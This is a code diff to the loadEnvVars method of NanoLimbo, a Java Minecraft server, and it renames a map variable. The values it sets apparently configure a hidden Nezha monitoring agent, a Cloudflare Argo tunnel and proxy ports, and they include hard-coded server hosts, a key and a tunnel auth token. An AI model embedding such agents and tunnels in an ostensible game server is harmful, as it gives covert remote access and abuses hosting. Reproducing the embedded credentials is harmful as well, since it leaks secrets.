@@ -123,27 +123,27 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        env.put("UUID", "fb63b303-8ecd-4350-8efe-ac15c7cf1b12");
-        env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "nzha.zyr13112.dpdns.org");
-        env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "WuVhre1rzxwlVLl8ib");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "freezehost.yrz.de5.net");
-        env.put("ARGO_AUTH", "eyJhIjoiNzg2NjkxMTlhYTM5YTY1MWUwYmQ1ZGI3YmRhNzVlOTIiLCJ0IjoiMWU2NDNkMzgtNWFlOC00YjM4LWEyNWMtMjFkNzY3YWEwNjllIiwicyI6IllqazBZelJpT1dFdE1HTTRNeTAwT1RRM0xUaGtNemd0TnpneU9UVTNOams1WTJNNCJ9");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "8466");
-        env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
-        env.put("ANYREALITY_PORT", "");
-        env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
-        env.put("CFPORT", "443");
-        env.put("NAME", "FreezehostNL");
-        env.put("DISABLE_ARGO", "false");
+        envVars.put("UUID", "fb63b303-8ecd-4350-8efe-ac15c7cf1b12");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "nzha.zyr13112.dpdns.org");
+        envVars.put("NEZHA_PORT", "443");
+        envVars.put("NEZHA_KEY", "WuVhre1rzxwlVLl8ib");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "freezehost.yrz.de5.net");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNzg2NjkxMTlhYTM5YTY1MWUwYmQ1ZGI3YmRhNzVlOTIiLCJ0IjoiMWU2NDNkMzgtNWFlOC00YjM4LWEyNWMtMjFkNzY3YWEwNjllIiwicyI6IllqazBZelJpT1dFdE1HTTRNeTAwT1RRM0xUaGtNemd0TnpneU9UVTNOams1WTJNNCJ9");
+        envVars.put("S5_PORT", "");
+        envVars.put("HY2_PORT", "8466");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "spring.io");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "FreezehostNL");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
